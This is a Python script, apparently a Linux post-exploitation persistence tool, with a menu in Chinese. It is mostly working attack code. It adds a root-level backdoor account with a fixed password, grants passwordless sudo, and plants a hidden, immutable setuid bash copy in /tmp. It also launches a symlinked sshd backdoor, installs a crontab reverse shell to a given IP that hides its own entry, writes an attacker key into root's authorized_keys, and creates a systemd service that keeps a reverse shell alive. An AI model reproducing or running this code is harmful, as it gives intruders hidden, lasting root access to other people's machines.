#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
def show():
    print(
        '''
 _____    _  __  ______   ______   _____ 
|  __ \\  | |/ / |  ____| |  ____| |  __ \\ 
| |__) | | ' /  | |__    | |__    | |__) |
|  ___/  |  <   |  __|   |  __|   |  ___/
| |      | . \\  | |____  | |____  | |     
|_|      |_|\\_\\ |______| |______| |_|     by 帆高
请选择维持方式：
    [1] 添加后门账户
    [2] 为账户添加sudo权限
    [3] 隐藏bash命令
    [4] 软链sshd后门
    [5] crontab反向Shell
    [6] 写入公钥
    [7] 持久化反向Shell
    ''')
# def history():
#     import os
#     os.system("export HISTCONTROL=ignorespace")
#     os.system(" set +o history")
#     id = os.popen("history | grep -n 'ignorespace' | awk -F: '{print $1}'").read().strip()
#     os.system(f"history -d {id}")
#     t1 = int(os.popen("history | grep 'ignorespace' | wc -l").read().strip())
#     t2 = int(os.popen("history | grep 'kfcvme50' | wc -l").read().strip())
#     if t1 == 0 and t2 == 0:
#         print("成功关闭历史命令记录！")
#     else:
#         print("关闭历史命令失败")

def bDoorAdd(user):
    import os
    a = int(os.popen(f"cat /etc/passwd | grep '{user}' | wc -l").read().strip())
    if a == 1:
        print(f"{user}账号已经存在")
    else:
        os.system(f"echo '{user}:advwtv/9yU5yQ:0:0:,,,:/root:/bin/bash' >> /etc/passwd")
        c = int(os.popen(f"tail /etc/passwd | grep '{user}' | wc -l").read().strip())
        if c == 1:
            print(f"添加成功，用户名为{user}，密码为：password@123")
        else:
            print("添加失败")

def sudoAdd(user):
    import os
    if int(os.popen(f"cat /etc/passwd | grep {user} | wc -l").read().strip()) == 1:
        os.system(f"echo '{user} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
        c = int(os.popen(f"tail /etc/sudoers | grep '{user}' | wc -l").read().strip())
        if c == 1:
            print(f"添加成功，用户名为{user}")
        else:
            print("添加失败")
    else:
        print("账号不存在")

def hideBash():
    import os
    if int(os.popen("ls -al /tmp | grep '.access_1og' | wc -l").read().strip()) == 0:
        os.system("cp /bin/bash /tmp/.access_1og && chmod 4755 /tmp/.access_1og")
        os.system("touch -r /bin/bash /tmp/.access_1og")
        os.system("chattr +i /tmp/.access_1og")
        c = int(os.popen("ls -al /tmp | grep '.access_1og' | wc -l").read().strip())
        if c == 1:
            print("添加成功，文件名为/tmp/.access_1og")
            print("使用方法./tmp/.access_1og -p")
        else:
            print("添加失败")
    else:
        print("文件已经存在")
def checkPort(port):
    import os
    c = int(os.popen(f"netstat -anpt | grep '{port}' | wc -l").read().strip())
    if c >= 1:
        return 0
    else:
        return 1

def softLink(port):
    import os
    if int(os.popen(f"find ./ -name 'su'| wc -l").read().strip()) == 0:
        os.system(f"ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort={port}")
        c = checkPort(port)
        if c == 0:
            print(f"{port}端口sshd服务开启成功")
            print(f"建议使用ssh隐身登录：ssh -T root@ip -p {port}")
        else:
            print("启动失败")
    else:
        print("文件已经存在")

def Timing(ip, port):
    import os
    os.system(f"(printf \"*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1';\rno crontab for `whoami`%100c\n\")|crontab -")

def Pub():
    import os
    c = int(os.popen("find ./ -name 'id_rsa.pub' | wc -l").read().strip())
    if c == 0:
        print("请先上传公钥到当前目录")
    else:
        os.system("(echo -e '\n\n'; cat id_rsa.pub; echo -e '\n\n') >> /root/.ssh/authorized_keys")
        if int(os.popen("echo $?").read().strip()) == 0:
            print("公钥已写入")
        else:
            print("写入失败")

def persistShellWithSystemd(ip, port):
    import os

    # 定义systemd服务文件内容
    service_content = f"""
    [Unit]
    Description=Persistent Reverse Shell

    [Service]
    ExecStart=/bin/bash -c 'while true; do /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1; sleep 10; done'
    Restart=always
    User=root

    [Install]
    WantedBy=multi-user.target
    """

    # 将服务文件写入到systemd目录
    service_path = "/etc/systemd/system/reverse_shell.service"
    with open(service_path, "w") as service_file:
        service_file.write(service_content)

    # 重新加载systemd服务配置
    os.system("systemctl daemon-reload")

    # 启用并启动服务
    os.system("systemctl enable reverse_shell.service")
    os.system("systemctl start reverse_shell.service")

    # 检查服务状态
    service_status = os.popen("systemctl is-active reverse_shell.service").read().strip()
    if service_status == "active":
        print("反向Shell已持久化并通过systemd启动")
        print("systemctl start/status/stop reverse_shell.service")
    else:
        print("反向Shell持久化失败，服务未启动成功")


if __name__ == '__main__':
    show()
    #history()
    id = input("序号：")
    if id == '1':
        user = input("请输入添加账号名：")
        bDoorAdd(user)
    elif id == '2':
        user = input("请输入添加账户名：")
        sudoAdd(user)
    elif id == '3':
        hideBash()
    elif id == '4':
        while True:
            port = input("希望开放端口：")
            c = checkPort(port)
            if c == 0:
                print("端口被占用")
                continue
            else:
                softLink(port)
                break
    elif id == '5':
        ip = input("请输入ip：")
        port = input("请输入端口号：")
        Timing(ip, port)
    elif id == '6':
        Pub()
    elif id == '7':
        ip = input("请输入ip:")
        port = input("请输入端口:")
        persistShellWithSystemd(ip, port)
    else:
        print("无效的序号")
